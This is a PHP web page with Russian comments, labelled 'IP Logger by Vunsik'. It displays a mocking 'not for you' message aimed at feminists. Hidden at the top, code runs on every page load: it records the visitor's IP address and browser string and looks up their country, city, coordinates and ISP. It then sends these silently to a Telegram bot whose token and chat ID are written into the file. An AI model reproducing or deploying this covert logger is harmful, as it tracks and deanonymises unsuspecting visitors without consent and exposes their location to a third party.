<?php
ini_set('user_agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');
//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5347004231:AAG9jAADfOGR_AN_iEpK7vK2FPKrWKP0_zI"; // Токен бота сюда
$chat_id = "1732116256"; //Чат айди сюда

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }


$browser = $_SERVER['HTTP_USER_AGENT'];

// URL страницы, которую открываем
$url = 'http://ip-api.com/json/'.$ipaddress;

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

$ipinfo = json_decode($response);

$country = $ipinfo -> country;
$region = $ipinfo -> regionName;
$city = $ipinfo -> city;
$localtime = $ipinfo -> timezone;
$latitude = $ipinfo -> lat;
$longitude = $ipinfo -> lon;
$provider = $ipinfo -> isp;


//Собираем в массив то, что будет передаваться боту
$arr = array(
    'IP Logger by Vunsik🙂',
    'IP Адрес: ' => $ipaddress,
    '🏳Страна: ' => $country,
    '🏛Регион: ' => $region,
    '🏢Город: ' => $city,
    '🕐Местное время: ' => $localtime,
    '📡Широта и Долгота: ' => $latitude.' '.$longitude,
    '🗿Интернет провайдер: ' => $provider,
    '💻Браузер и User-Agent: ' => $browser  
);

//Настраиваем внешний вид сообщения в телеграме
foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b> ".$value."%0A";
};

//Передаем данные боту
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


?>
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="initial-scale=1.0">
  <title>Страница не для тебя — VnA</title>
  <link rel="stylesheet" href="css/standardize.css">
  <link rel="stylesheet" href="css/sorry-grid.css">
  <link rel="stylesheet" href="css/sorry.css">
  <link rel="shortcut icon" href="images/logo.png" type="image/x-icon">
</head>
<body class="body page-sorry clearfix">
  <div class="container clearfix">
    <div class="element"></div>
    <p id="bold" class="text text-1">Упс</p>
    <p class="text text-2">вы слишком феменистка чтоб зайти сюда👍🏿🛐🤑😏🌹😈</p>
    <button onClick="window.location='index.html';" id="bold" class="_button _button-1">нажиратся  наших планах</button>
    <button onClick="window.location='https://discord.gg/BFA6g98dkX';" id="bold" class="_button _button-2">пойти плакаться в дискорд</button>
    <button onClick="window.location='about.html';" id="bold" class="_button _button-3">вычислить тупого автора</button>
    <button onClick="window.location='rules.html';" id="bold" class="_button _button-4">конституция</button>
    <button onClick="window.location='wiki.html';" id="bold" class="_button _button-5">вика</button>
  </div>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&family=Manrope:wght@200;300;400;500;600;700;800&display=swap');
    
    #bold {
        font-family: 'Manrope', cursive;
        font-weight: 700;
    },
  
    #text {
        font-family: 'Inter', cursive;
        font-weight: 200;
    }
</body>
</html>